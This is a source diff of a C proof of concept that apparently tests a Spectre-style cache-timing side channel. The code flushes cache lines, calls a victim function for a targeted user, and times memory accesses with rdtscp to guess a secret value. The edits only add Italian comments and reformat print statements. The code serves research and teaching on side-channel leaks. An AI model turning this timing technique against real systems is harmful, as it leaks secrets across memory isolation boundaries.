@@ -46,7 +46,8 @@ int main(int argn, char *argv[]) {
 	// 4 - precision loss
 
 	if (argn - 1 != 4) {
-		printf("Illegal number of arguments. It must be 4 (#round, #test, #threshold, precisionLoss\n");
+		printf(
+				"Illegal number of arguments. It must be 4 (#round, #test, #threshold, precisionLoss\n");
 		exit(1);
 	}
 
@@ -108,22 +109,31 @@ int main(int argn, char *argv[]) {
 					_mm_clflush(&passwordDigest[i]);
 				}
 
+				/*introduzione di ritardi per essere sicuri
+				 * dell'esecuzione delle istruzioni precedenti
+				 * (si puo usare anche mfence)*/
 				for (volatile int z = 0; z < 100; z++) {
-				} /* Delay (can also mfence) */
+				}
 
 				// richiamo la funzione vittima con l'ID da attaccare
 				victim_function(userUnderAttack, 1);
 
+				/*introduzione di ritardi per essere sicuri
+				 * dell'esecuzione delle istruzioni precedenti
+				 * (si puo usare anche mfence)*/
 				for (volatile int z = 0; z < 100; z++) {
-				} /* Delay (can also mfence) */
+				}
 
 				// calcolo il tempo di accesso alla posizione l
 				time1 = __rdtscp(&timeReg);
 				timeReg = array2[l * delta];
 				time2 = __rdtscp(&timeReg) - time1;
 
+				/*introduzione di ritardi per essere sicuri
+				 * dell'esecuzione delle istruzioni precedenti
+				 * (si puo usare anche mfence)*/
 				for (volatile int z = 0; z < 100; z++) {
-				} /* Delay (can also mfence) */
+				}
 
 				// aggiorno la posizione corrispondente di results
 				// se il tempo < della soglia
@@ -163,14 +173,15 @@ int main(int argn, char *argv[]) {
 					numberOfRuns);
 			noHit++;
 		} else {
-			printf("***** ERROR: prediction between %d and %d, secret = %d\n", rangeMin,
-					rangeMax, secret[userUnderAttack]);
+			printf("***** ERROR: prediction between %d and %d, secret = %d\n",
+					rangeMin, rangeMax, secret[userUnderAttack]);
 			error++;
 		}
 	}
 
 // stampo il conteggio totale degli errori e degli ok
-	printf("***TOTAL***\nOK -> %d\nNO-HIT -> %d\nERROR -> %d\n", ok, noHit, error);
+	printf("***TOTAL***\nOK -> %d\nNO-HIT -> %d\nERROR -> %d\n", ok, noHit,
+			error);
 
 	return (0);
 }
